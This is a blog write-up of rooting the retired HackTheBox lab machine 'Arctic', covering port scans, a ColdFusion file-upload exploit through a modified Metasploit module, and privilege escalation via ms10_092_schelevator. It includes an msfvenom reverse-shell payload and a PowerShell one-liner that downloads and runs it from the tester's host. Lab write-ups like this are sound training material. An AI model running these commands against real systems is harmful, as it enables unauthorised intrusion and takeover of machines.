---
layout: post
title: "Writeup: HackTheBox Arctic - with Metasploit"
description: "Rooting Arctic using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Arctic

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.11</small>_

I run a quick port scan to identify the open ports:

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.11

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 22:21 EDT
Nmap scan report for 10.10.10.11
Host is up (0.018s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

I then interrogate the three open ports:

```bash
nmap -A -sC -sV -Pn -p135,8500,49154 10.10.10.11

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 22:23 EDT
Nmap scan report for 10.10.10.11
Host is up (0.013s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

THe 8500 port defies identification. Navigating to it in my browser, I see it is a web server.

I bust out [gobuster][]. It times out trying to query the server. By manually navigating to a few test paths and counting seconds, I see the issue. The server waits 25 seconds before responding to any web request.

I extend gobuster's HTTP timeout to 35 seconds with the flag `--timeout 35`.

It takes a while for the brute force to run, but I eventually make my way to this page:

`http://10.10.10.11:8500/CFIDE/administrator/enter.cfm`

Where I find a [Coldfusion][] web server.

Searching for vulnerabilities on exploit-db with `searchsploit coldfusion`, I find the following:

`Adobe ColdFusion 2018 - Arbitrary File Upload | exploits/multiple/webapps/45979.txt`

Ah, and it has a matching Metasploit module: `exploit/windows/http/coldfusion_fckeditor`.

This module will not work out of the box, however, as its default timeout is 5 seconds.

The module file is located at `/usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb`.

You want to find the `send_request_cgi` and `send_request_raw` methods and change the `5` at the end of their function declarations to `30`, to increase their timeouts from 5 seconds to 30 seconds.

![modifying metasploit module source to extend timeout to 30 seconds][msf module modify]

From there, you can execute this exploit to obtain a user shell and the accompanying user flag.

Let's take this user shell and upgrade it to a Meterpreter shell so that we can run Metasploit's [local privilege suggester][priv sug] for privilege escalation options.

We create a payload with `msfvenom` and start a local web server:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.29 lport=4645 -f exe > shell.exe
sudo python3 -m http.server
```

Then, in our user shell on the target, we can execute this powershell one-liner to download the file:

```bat
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.29:8000/shell.exe', 'fun.exe')"
```

From there we start a Meterpreter handler on port `4645` and run the `fun.exe` executable on the target. Our meterpreter user shell connects.

Now run run `post/multi/recon/local_exploit_suggester`:

```bash
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.11 - Collecting local exploits for x64/windows...
[*] 10.10.10.11 - 15 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```

Our user is not in the Administrators group so we cannot use the first two exploits.

The third exploit, `exploit/windows/local/ms10_092_schelevator`, is successful and we get a root shell. From here we can grab our root flag.

[hackthebox]: https://www.hackthebox.eu

[coldfusion]: https://coldfusion.adobe.com
[gobuster]: https://github.com/OJ/gobuster
[msf module modify]: /assets/img/htb/arctic/msf-module-modify-timeout.png
[priv sug]: https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/
